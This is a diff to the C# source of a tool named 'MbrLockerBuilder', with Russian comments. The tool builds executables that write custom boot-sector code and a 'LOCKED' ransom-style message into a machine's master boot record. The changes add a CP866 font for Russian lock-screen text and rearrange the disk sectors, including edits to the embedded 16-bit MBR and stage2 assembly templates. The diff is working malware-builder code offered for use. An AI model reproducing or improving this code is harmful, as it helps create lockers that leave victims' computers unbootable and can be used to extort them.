@@ -12,7 +12,6 @@ namespace MbrLockerBuilder
 {
     public class MainForm : Form
     {
-        // WinAPI для работы с ресурсами
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);
 
@@ -323,6 +322,34 @@ namespace MbrLockerBuilder
         }
 
         // ============================================================
+        // ГЕНЕРАЦИЯ ШРИФТА CP866 ИЗ РЕСУРСА
+        // ============================================================
+        private byte[] GenerateCP866Font()
+        {
+            try
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.cp866_font.bin"))
+                {
+                    if (stream != null)
+                    {
+                        byte[] font = new byte[4096];
+                        stream.Read(font, 0, 4096);
+                        return font;
+                    }
+                }
+            }
+            catch { }
+
+            string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "cp866_font.bin");
+            if (File.Exists(localPath))
+                return File.ReadAllBytes(localPath);
+
+            MessageBox.Show("Шрифт cp866_font.bin не найден! Русский текст будет отображаться неправильно.",
+                "Предупреждение", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            return new byte[4096];
+        }
+
+        // ============================================================
         // МЕТОДЫ ДЛЯ ПОДДЕРЖКИ РУССКОГО ЯЗЫКА
         // ============================================================
 
@@ -417,16 +444,30 @@ namespace MbrLockerBuilder
                 this.lblStatus.Text = "4/7 Сборка образа...";
                 Application.DoEvents();
 
-                int totalSectors = 16;
+                int totalSectors = 18;
                 byte[] fullImage = new byte[512 * totalSectors];
                 
+                // MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
-                Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
                 
+                // Stage2 (сектора 9-17)
+                Array.Copy(stage2Bytes, 0, fullImage, 512 * 9, Math.Min(stage2Bytes.Length, 512 * 9));
+
                 // ============================================================
-                // ЗАПИСЫВАЕМ ТЕКСТ В ОТДЕЛЬНЫЕ СЕКТОРА (4, 5, 6) С ТЕРМИНАЛЬНЫМ НУЛЕМ
+                // ЗАПИСЫВАЕМ ПОЛЬЗОВАТЕЛЬСКИЙ ШРИФТ (СЕКТОРА 3-4)
                 // ============================================================
-                
+                this.lblStatus.Text = "4.1/7 Генерация шрифта...";
+                Application.DoEvents();
+
+                byte[] fontData = GenerateCP866Font();
+                if (fontData != null && fontData.Length >= 1024)
+                {
+                    Array.Copy(fontData, 0, fullImage, 512 * 3, 1024);
+                }
+
+                // ============================================================
+                // ЗАПИСЫВАЕМ ТЕКСТ В СЕКТОРА (5, 6) С ТЕРМИНАЛЬНЫМ НУЛЕМ
+                // ============================================================
                 string title = this.txtTitle.Text.Trim();
                 string body = this.txtBody.Text.Trim();
                 if (string.IsNullOrEmpty(title)) title = "LOCKED";
@@ -436,17 +477,17 @@ namespace MbrLockerBuilder
                 string formattedTitle = "     " + title + "     \r\n";
                 string formattedBody = body.Replace("\n", "\r\n");
 
-                // --- Заголовок (сектор 4) с терминальным нулём ---
+                // --- Заголовок (сектор 5) с терминальным нулём ---
                 string titleText = border + formattedTitle + border + "\r\n\0";
                 byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(titleText);
                 if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
-                Array.Copy(titleBytes, 0, fullImage, 512 * 4, titleBytes.Length);
+                Array.Copy(titleBytes, 0, fullImage, 512 * 5, titleBytes.Length);
 
-                // --- Основной текст (сектора 5-6) с терминальным нулём ---
+                // --- Основной текст (сектор 6) с терминальным нулём ---
                 string bodyText = formattedBody + "\0";
                 byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(bodyText);
-                if (bodyBytes.Length > 512 * 2) Array.Resize(ref bodyBytes, 512 * 2);
-                Array.Copy(bodyBytes, 0, fullImage, 512 * 5, bodyBytes.Length);
+                if (bodyBytes.Length > 512) Array.Resize(ref bodyBytes, 512);
+                Array.Copy(bodyBytes, 0, fullImage, 512 * 6, bodyBytes.Length);
 
                 this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
@@ -550,7 +591,6 @@ namespace MbrLockerBuilder
 
         private string GenerateMBR()
         {
-            // 1. Пробуем загрузить из встроенных ресурсов (внутри EXE)
             try
             {
                 using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.mbr.asm"))
@@ -566,12 +606,10 @@ namespace MbrLockerBuilder
             }
             catch { }
 
-            // 2. Если не вышло — ищем в папке locker (для отладки)
             string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
             if (File.Exists(localPath))
                 return File.ReadAllText(localPath);
 
-            // 3. Запасной вариант (встроенный шаблон)
             return @"
 BITS 16
 ORG 0x7C00
@@ -590,9 +628,9 @@ start:
     mov es, ax
     mov bx, 0x8000
     mov ah, 0x02
-    mov al, 6
+    mov al, 9
     mov ch, 0
-    mov cl, 3
+    mov cl, 9
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -631,7 +669,6 @@ dw 0xAA55";
         {
             string template = null;
 
-            // 1. Пробуем загрузить из встроенных ресурсов (внутри EXE)
             try
             {
                 using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.stage2.asm"))
@@ -647,7 +684,6 @@ dw 0xAA55";
             }
             catch { }
 
-            // 2. Если не вышло — ищем в папке locker (для отладки)
             if (string.IsNullOrEmpty(template))
             {
                 string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "stage2.asm");
@@ -655,7 +691,6 @@ dw 0xAA55";
                     template = File.ReadAllText(localPath);
             }
 
-            // 3. Если всё равно пусто — используем запасной шаблон
             if (string.IsNullOrEmpty(template))
             {
                 template = @"
@@ -673,7 +708,23 @@ start_stage2:
     mov dx, 0x184F
     int 0x10
 
-    mov ax, 0x0A00
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x1000
+    mov ah, 0x02
+    mov al, 2
+    mov ch, 0
+    mov cl, 3
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    mov ax, 0x1100
+    mov bx, 0x0100
+    int 0x10
+
+    mov ax, 0x0F00
     int 0x10
 
     mov ax, 0x0000
@@ -682,7 +733,7 @@ start_stage2:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 4
+    mov cl, 5
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -695,9 +746,9 @@ start_stage2:
     mov es, ax
     mov bx, 0x9200
     mov ah, 0x02
-    mov al, 2
+    mov al, 1
     mov ch, 0
-    mov cl, 5
+    mov cl, 6
     mov dh, 0
     mov dl, 0x80
     int 0x13
